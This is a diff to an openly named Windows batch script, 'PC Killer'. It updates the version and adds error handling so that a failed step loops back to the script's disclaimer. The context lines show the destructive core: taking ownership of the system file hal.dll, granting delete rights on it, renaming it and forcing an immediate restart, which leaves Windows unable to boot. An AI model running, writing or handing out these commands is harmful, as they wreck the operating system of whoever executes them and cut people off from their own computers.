@@ -2,7 +2,7 @@
 title PC Killer
 setlocal
 echo Program Name: PC Killer
-echo Version: 1.2.0
+echo Version: 1.3.0
 echo Developer: @YonatanReuvenIsraeli
 echo Website: https://www.yonatanreuvenisraeli.dev
 echo License: GNU General Public License v3.0
@@ -49,9 +49,15 @@ goto Warning
 takeown /f "%SystemRoot%\System32\hal.dll"
 icacls "%SystemRoot%\System32\hal.dll" /grant %USERNAME%:(d,wdac)
 ren "%SystemRoot%\System32\hal.dll" "hal1.dll"
+if not "%errorlevel%"=="0" goto Error
 endlocal
 shutdown /r /t 00
 exit
+
+:Error
+echo.
+echo There has been an error! You can try again.
+goto Disclaimer
 
 :Close
 endlocal
